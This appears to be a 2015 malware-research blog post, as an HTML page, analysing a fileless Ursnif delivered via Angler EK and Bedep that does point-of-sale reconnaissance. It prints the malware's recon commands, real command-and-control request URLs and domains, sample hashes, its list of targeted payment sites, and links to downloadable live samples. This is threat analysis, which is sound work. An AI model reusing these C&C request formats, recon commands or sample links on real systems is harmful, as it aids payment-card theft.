@@ -1,0 +1,468 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>A fileless Ursnif doing some POS focused reco</title>
+
+    <link rel="stylesheet" type="text/css" href="http://malware.dontneedcoffee.com/assets/css/styles_feeling_responsive.css">
+
+  
+
+	<script src="http://malware.dontneedcoffee.com/assets/js/modernizr.min.js"></script>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js"></script>
+	<script>
+		WebFont.load({
+			google: {
+				families: [ 'Lato:400,700,400italic:latin', 'Volkhov::latin' ]
+			}
+		});
+	</script>
+
+	<noscript>
+		<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic%7CVolkhov' rel='stylesheet' type='text/css'>
+	</noscript>
+
+
+	<!-- Search Engine Optimization -->
+	<meta name="description" content="Malware doing some reco from memory">
+  	
+	
+	
+	
+	
+	<link rel="canonical" href="http://malware.dontneedcoffee.com/2015/07/a-fileless-ursnif-doing-some-pos.html">
+
+
+	<!-- Facebook Open Graph -->
+	<meta property="og:title" content="A fileless Ursnif doing some POS focused reco">
+	<meta property="og:description" content="Malware doing some reco from memory">
+	<meta property="og:url" content="http://malware.dontneedcoffee.com/2015/07/a-fileless-ursnif-doing-some-pos.html">
+	<meta property="og:locale" content="en_EN">
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="MDNC | Malware don't need Coffee">
+	
+	
+
+
+	
+	<!-- Twitter -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Kafeine">
+	<meta name="twitter:creator" content="Kafeine">
+	<meta name="twitter:title" content="A fileless Ursnif doing some POS focused reco">
+	<meta name="twitter:description" content="Malware doing some reco from memory">
+	
+	
+
+	<link type="text/plain" rel="author" href="http://malware.dontneedcoffee.com/humans.txt">
+
+	
+
+	
+
+	<link rel="icon" sizes="32x32" href="http://malware.dontneedcoffee.com/assets/img/favicon-32x32.png">
+
+	<link rel="icon" sizes="192x192" href="http://malware.dontneedcoffee.com/assets/img/touch-icon-192x192.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-180x180-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-152x152-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-144x144-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-120x120-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-114x114-precomposed.png">
+
+	
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-76x76-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-72x72-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-precomposed.png">	
+
+	<meta name="msapplication-TileImage" content="http://malware.dontneedcoffee.com/assets/img/msapplication_tileimage.png">
+
+	<meta name="msapplication-TileColor" content="#fabb00">
+
+
+	
+
+</head>
+<body id="top-of-page" class="post">
+	
+	<div id="navigation" class="sticky">
+  <nav class="top-bar" role="navigation" data-topbar>
+    <ul class="title-area">
+      <li class="name">
+      <h1 class="show-for-small-only"><a href="http://malware.dontneedcoffee.com" class="icon-fisticup"> MDNC | Malware don't need Coffee</a></h1>
+    </li>
+       <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+      <li class="toggle-topbar menu-icon"><a href="#"><span>Navigation</span></a></li>
+    </ul>
+    <section class="top-bar-section">
+
+      <ul class="right">
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/search/">Search</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/faq/">FAQ</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/contact/">Contact</a></li>
+
+            
+            
+          
+        
+        
+      </ul>
+
+      <ul class="left">
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/blog/">Blog</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/external/">External</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/blog/archive/">Archive</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+        
+      </ul>
+    </section>
+  </nav>
+</div><!-- /#navigation -->
+
+	
+
+	
+
+<div id="masthead-no-image-header">
+	<div class="row">
+		<div class="small-6 columns">
+			<a id="logo" href="http://malware.dontneedcoffee.com" title="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+				<img src="http://malware.dontneedcoffee.com/assets/img/logo.png" alt="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+			</a>
+		</div><!-- /.small-12.columns -->
+	</div><!-- /.row -->
+</div><!-- /#masthead -->
+
+
+
+
+
+
+
+
+	<div class="row t30">
+	<div class="medium-12 columns medium-offset-2 end">
+		<article itemscope itemtype="http://schema.org/Article">
+			<header>
+				
+
+				<div itemprop="name">
+					<p class="subheadline">2015-07-05  - Fileless Reco</p>
+					<h1>A fileless Ursnif doing some POS focused reco</h1>
+				</div>
+			</header>
+
+
+
+			<div itemprop="articleSection">
+			<br /><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-9W3H1FTLYuw/VZl_TCbzR4I/AAAAAAAAE30/Nw7x-KxIWtE/s1600/2015-07-05_21h02_10.png"><img border="0" src="https://4.bp.blogspot.com/-9W3H1FTLYuw/VZl_TCbzR4I/AAAAAAAAE30/Nw7x-KxIWtE/s1600/2015-07-05_21h02_10.png" /></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Mission Impossible via <a href="https://www.flickr.com/photos/35385165@N05/6130349338/in/photostream/">Brixe63</a></span></div><br /><br />At begining of June, I noticed a "different" Angler pass.<br />No drop and Ursnif call backs.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-RTGwCF2bqEs/VZlRft0h0pI/AAAAAAAAE2U/3qhOmXWsMjo/s1600/2015-07-05_17h46_52.png"><span style="font-size: xx-small;"><img border="0" src="https://1.bp.blogspot.com/-RTGwCF2bqEs/VZlRft0h0pI/AAAAAAAAE2U/3qhOmXWsMjo/s640/2015-07-05_17h46_52.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">FileLess Angler Pass and Ursnif Callback</span></div><div style="text-align: center;"><span style="font-size: xx-small;">Mon, 01 Jun 2015 14:48:06 GMT</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>I already encountered that "small ursnif" multiple time. In november for instance some 18ko sample pushed in Bedep  <a href="https://www.virustotal.com/file/0a38c363c8353140c6e90055e8812ab5b3255a04afe0bfbcb8c751107df3ba9b/analysis/">380278c243a03c70dba89af2e6d4916f</a> (grabbing a sample doing some IAP like callback - <a href="https://www.virustotal.com/intelligence/download/?sha256=43fce12aace6e73fc7b1e1117595816e">43fce12aace6e73fc7b1e1117595816e</a> )<br /><div style="text-align: center;"><br /></div><div style="text-align: center;"><span style="font-size: xx-small;"><a href="http://1.bp.blogspot.com/-fmYu1ihTDFY/VZll-jtiSZI/AAAAAAAAE2k/i49lfoBdYfk/s1600/2015-07-05_19h14_24.png"><img border="0" src="https://1.bp.blogspot.com/-fmYu1ihTDFY/VZll-jtiSZI/AAAAAAAAE2k/i49lfoBdYfk/s640/2015-07-05_19h14_24.png" /></a></span></div><div style="text-align: center;"><span style="font-size: xx-small;">Ursnif sent to Bedep infected VM</span></div><div style="text-align: center;"><span style="font-size: xx-small;">2014-11-07</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>and few days later : ff1da0bbfc66762dbc1b2af52425f211 <br /><br />C&amp;C calls in november 2014 :<br /><br /><span style="color: #351c75; font-size: x-small;"><i>GET http://ipsalomenatep58highwayroad .biz:8080/photoLibrary/?user=c54acfbc9b5eef3b729f4025c17cefa2&amp;id=1&amp;ver=105&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=1859056880&amp;type=1<br />200 OK (text/html)<br /><br />GET http://ipsalomenatep58highwayroad .biz:8080/photoLibrary/?user=c54acfbc9b5eef3b729f4025c17cefa2&amp;id=1&amp;ver=105&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=1039729551&amp;type=505<br />200 OK (text/html)  &lt; 2ndStage payload </i></span><br /><br />What is new in that June pass is the Fileless execution of this Ursnif. In that context seeing it making some net view and registry  CurrentVersion\Uninstall check <br /><br /><blockquote class="tr_bq"><span style="color: #351c75; font-size: x-small;"><i>cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName &gt; C:\Users\[REDACTED]\AppData\Local\Temp\28096234.TMP"</i></span><span style="color: #351c75; font-size: x-small;"><i><br /></i></span><span style="color: #351c75; font-size: x-small;"><i>cmd /C "net.exe view &gt; C:\Users\[REDACTED]\AppData\Local\Temp\28097562.TMP"</i></span></blockquote><br />before calling C&amp;C made me think this might be reco.<br /><br />XTea decoded from the PCAP the sample I got was  :<br /><a href="https://www.virustotal.com/file/2618c9e3f99942c6b1d2d3738abe6b1a97f5f504037882662771f6bb6baa4cf8/analysis/">a619632af465759a3d3d45f39f988c3f</a><br />Running it manually i got him to grab (call &amp;type=505) an Andromeda<br /><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-vAfCEGRKinA/VZlp8R_5BWI/AAAAAAAAE24/o11kUykpP88/s1600/2015-07-05_19h30_45.png"><span style="font-size: xx-small;"><img border="0" src="https://2.bp.blogspot.com/-vAfCEGRKinA/VZlp8R_5BWI/AAAAAAAAE24/o11kUykpP88/s640/2015-07-05_19h30_45.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Fileless Ursnif calling C&amp;C, Grabbing Andromeda.</span></div><div style="text-align: center;"><span style="font-size: xx-small;">Andromeda Calling home.</span></div><div style="text-align: center;"><br /></div><br />Upon deeper looks it appears that this Ursnif is doing those kind of checks :<br /><br /><u>Case one :</u><br />- POS/SALE/STORE in the Netview output<br />- some URL in the cache :</div><div><blockquote class="tr_bq"><i><span style="color: #351c75;">choiceadvantage.com<br />uhauldealer.com<br />secure-booker.com<br />teletracker.com<br />wupos.westernunion.com<br />pay1.plugnpay.com<br />secure.paymentech.com/iterminal/</span></i></blockquote><u>Case two :</u><br />- some entries in the registry :<br />VeriFone  (advertises itself as the "global leader in secure electronic POS solutions")<br />(there are 2 strings Citrix and XenApp but do not seems to be directly called)<br /><br /><u>Case three : </u><br />- None of these..so "lower value" (for them) machine.<br /><br />I made some modif in my systems to fall in case one :</div><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-HJszkcusw5M/VZlwfh_9alI/AAAAAAAAE3I/pdc2wcu8nHg/s1600/2015-06-21_17h37_30.png"><span style="font-size: xx-small;"><img border="0" src="https://4.bp.blogspot.com/-HJszkcusw5M/VZlwfh_9alI/AAAAAAAAE3I/pdc2wcu8nHg/s1600/2015-06-21_17h37_30.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Trying to get the attention of the Fileless Ursnif</span></div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><br /></div>And as expected it's something else than Andromeda that got dropped (c&amp;c call with &amp;type=555) on the machine</div><div><br /><a href="https://www.virustotal.com/file/f74c8ca0adfb38e9f38aad3f13bfcecf88fdc30a83a3bcd574f1640ed506189d/analysis/1434905738/">76c240311df959961200a20f52b4026c</a>&nbsp;which appears to be a signed<br /><br /><br /><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-OfuvuqbKLM8/VZlxXh8A4PI/AAAAAAAAE3Q/r-HgjTdi1VY/s1600/2015-06-21_21h07_18.png"><span style="font-size: xx-small;"><img border="0" src="https://3.bp.blogspot.com/-OfuvuqbKLM8/VZlxXh8A4PI/AAAAAAAAE3Q/r-HgjTdi1VY/s1600/2015-06-21_21h07_18.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Signed Dll dropped by the Fileless Ursnif</span></div><div style="text-align: center;"><br /></div>&nbsp;and decided to stand on the drive version of itself.</div><div><br /></div><div><b><u>Conclusion:</u></b> another smart use of the fileless capabilities of Angler.</div><div><br /></div><div><u>Side Note:</u><br />It seems type 666 and type 922 are other accepted call by the C&amp;C (one of them might be Verifone case)</div><div><div style="text-align: center;"><span style="font-size: xx-small;"><br /></span></div><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-106XBn0wORY/VZl7BBa5X8I/AAAAAAAAE3g/9xRPEOobSds/s1600/2015-07-05_20h43_53.png"><span style="font-size: xx-small;"><img border="0" src="https://1.bp.blogspot.com/-106XBn0wORY/VZl7BBa5X8I/AAAAAAAAE3g/9xRPEOobSds/s640/2015-07-05_20h43_53.png" /></span></a></div><div style="text-align: center;"><span style="font-size: xx-small;">Crafted C&amp;C Calls - note: &nbsp;type 666 and 922</span></div><br />Fiddler for those who can decrypt the traffic based on the Key is in the package (i'd be happy to hear about it )<br /><br /><a href="https://files.dontneedcoffee.com/index.php/s/1T3aobx8pcbLOH7">Here is a package</a> (multiple samples/pcap/fiddler)<br /><a href="https://files.dontneedcoffee.com/index.php/s/dBwxYQlP3sWUGUo">Fileless Angler EK Pass</a> (Pcap associated to first Screenshot&nbsp;)<br /><br />[Update : 2015-09-04]<br />It's pushed via Bedep those day :<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-EMx_0rh5ZrQ/VemGCnGrMFI/AAAAAAAAFGE/2vb-PMGvCDo/s1600/2015-09-04_13h49_23.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="92" src="https://3.bp.blogspot.com/-EMx_0rh5ZrQ/VemGCnGrMFI/AAAAAAAAFGE/2vb-PMGvCDo/s640/2015-09-04_13h49_23.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Fileless Ursnif pushed via Bedep but again no drop on disc (new to me method in bedep)<br />2015-09-04</td></tr></tbody></table>Sample :&nbsp;<span style="background-color: white; color: #333333; font-family: &quot;helvetica neue&quot; , &quot;helvetica&quot; , &quot;arial&quot; , sans-serif; font-size: 13px; line-height: 20px;"><a href="https://www.virustotal.com/en/file/b7d0aebab3c09601efb13b127f066641aafc88d89f6b803e390b8aa4c197835d/analysis/1441367711/">d8e950506fcb4617ef3bbcb16c4fba24</a></span><br />C&amp;C : lokingforrealest.net (82.211.31.126)<br />/yuppi/?user=c54acfbc9b5eef3b729f4025323a731c&amp;id=19&amp;ver=119&amp;os=170393861&amp;os2=512&amp;host=0&amp;k=88401496&amp;type=505<br /><br />31400 | 82.211.0.0/18 | ACCELERATED | DE | kundenbetreuung.org | IP-Projects GmbH &amp; Co. KG<br /><div>[/edit]</div><br /><br /><b><u>Thanks :</u></b><br /><a href="https://twitter.com/node5">Will Metcalf</a>, <a href="https://twitter.com/horgh_rce">Horgh_RCE</a> and <a href="https://www.fox-it.com/en/">FoxIT</a> for help/inputs.<br /><br /><b><u>Post Publication Readings :</u></b><br /><a href="https://www.fireeye.com/blog/threat-research/2016/05/windows-zero-day-payment-cards.html">Threat actor leverages windows zero-day exploit in payment card data attacks</a> - 2016-05-10 - FireEye<br /><a href="http://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/">PowerSniff Malware Used in Macro-based Attacks</a> - 2016-03-11 - Palot Alto<br /><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/angler-exploit-kit-used-to-find-and-infect-pos-systems/">Angler Exploit Kit Used to Find and Infect PoS Systems</a> - 2015-07-27 - TrendMicro</div>
+			</div>
+
+			
+						<div id="page-meta" class="t30">
+				<p>
+					<!-- Look the author details up from the site config. -->
+					
+					<!-- Output author details if some exist. -->
+					
+					<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="pr20 icon-edit"><a href="https://twitter.com/kafeine" target="_blank"> Kafeine</a></span>
+				</span>
+				
+
+				
+				<time class="icon-calendar pr20" datetime="2015-07-05" itemprop="datePublished"> 2015-07-05</time>
+				
+
+				<span class="icon-archive pr20"> BOTNET</span>
+				<br />
+				<span class="pr20"><span class="icon-price-tag pr10"> POS</span> <span class="icon-price-tag pr10"> Fileless</span> <span class="icon-price-tag pr10"> STORE</span> <span class="icon-price-tag pr10"> Bedep</span> <span class="icon-price-tag pr10"> Punchtrack</span> <span class="icon-price-tag pr10"> Ursnif</span> <span class="icon-price-tag pr10"> SALE</span> <span class="icon-price-tag pr10"> Powersniff</span> <span class="icon-price-tag pr10"> reco</span> <span class="icon-price-tag pr10"> Punchbuggy</span> <span class="icon-price-tag pr10"> Angler EK</span> </span>
+			</p>
+
+			<div id="post-nav" class="row">
+				
+				<div class="small-5 columns"><a class="button small radius prev" href="http://malware.dontneedcoffee.com/2015/07/kovter-adfraud-is-updating-flash-for-you.html">&laquo; Kovter AdFraud is updating Flash Player (and Internet Explorer)</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-2 columns text-center"><a class="radius button small" href="http://malware.dontneedcoffee.com/blog/archive/" title="Blog Archive">Archive</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-5 columns text-right"><a class="button small radius next" href="http://malware.dontneedcoffee.com/2015/07/hackingteam-flash-0d-cve-2015-xxxx-and.html">CVE-2015-5119 (HackingTeam 0d - Flash up to 18.0.0.194) and Exploit Kits &raquo;</a></div><!-- /.small-4.columns -->
+				
+			</div>
+			</div><!--  /.page-meta -->
+			
+
+			
+		</article>
+	</div><!-- /.medium-8.columns -->
+
+
+	
+
+
+	
+</div><!-- /.row -->
+
+
+	
+	    <div id="up-to-top" class="row">
+      <div class="small-12 columns" style="text-align: right;">
+        <a class="iconfont" href="#top-of-page">&#xf108;</a>
+      </div><!-- /.small-12.columns -->
+    </div><!-- /.row -->
+
+
+    <footer id="footer-content" class="bg-grau">
+      <div id="footer">
+        <div class="row">
+          <div class="medium-6 large-5 columns">
+            <h5 class="shadow-black"></h5>
+
+            <p class="shadow-black">
+              Sleep is a symptom of caffeine deprivation.
+            </p>
+          </div><!-- /.large-6.columns -->
+
+
+          <div class="small-6 medium-3 large-3 large-offset-1 columns">
+            
+              
+                <h5 class="shadow-black">Services</h5>
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+
+              <ul class="no-bullet shadow-black">
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com"  title=""></a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/contact/"  title="Contact">Contact</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/feed.xml"  title="Subscribe to RSS Feed">RSS</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/atom.xml"  title="Subscribe to Atom Feed">Atom</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/sitemap.xml"  title="Sitemap for Google Webmaster Tools">sitemap.xml</a>
+                  </li>
+              
+              </ul>
+          </div><!-- /.large-4.columns -->
+
+
+          <div class="small-6 medium-3 large-3 columns">
+            
+              
+                <h5 class="shadow-black">Merci</h5>
+              
+            
+              
+            
+              
+            
+
+            <ul class="no-bullet shadow-black">
+            
+              
+                <li >
+                  <a href="http://malware.dontneedcoffee.com"  title=""></a>
+                </li>
+            
+              
+                <li class="network-misp" >
+                  <a href="https://www.misp-project.org/" target="_blank"  title="MISP Project - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing">MISP</a>
+                </li>
+            
+              
+                <li class="network-cuckoo" >
+                  <a href="https://cuckoosandbox.org/" target="_blank"  title="Automate Malware Analysis">Cuckoo</a>
+                </li>
+            
+            </ul>
+          </div><!-- /.large-3.columns -->
+        </div><!-- /.row -->
+
+      </div><!-- /#footer -->
+
+
+      <div id="subfooter">
+        <nav class="row">
+          <section id="subfooter-left" class="small-12 medium-6 columns credits">
+            
+          </section>
+
+          <section id="subfooter-right" class="small-12 medium-6 columns">
+            <ul class="inline-list social-icons">
+            
+              <li><a href="http://github.com/Kafeine" target="_blank" class="icon-github" title="Code and more..."></a></li>
+            
+              <li><a href="http://twitter.com/Kafeine" target="_blank" class="icon-twitter" title="Last tweets"></a></li>
+            
+            </ul>
+          </section>
+        </nav>
+      </div><!-- /#subfooter -->
+    </footer>
+
+	
+
+	
+
+
+<script src="http://malware.dontneedcoffee.com/assets/js/javascript.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
+
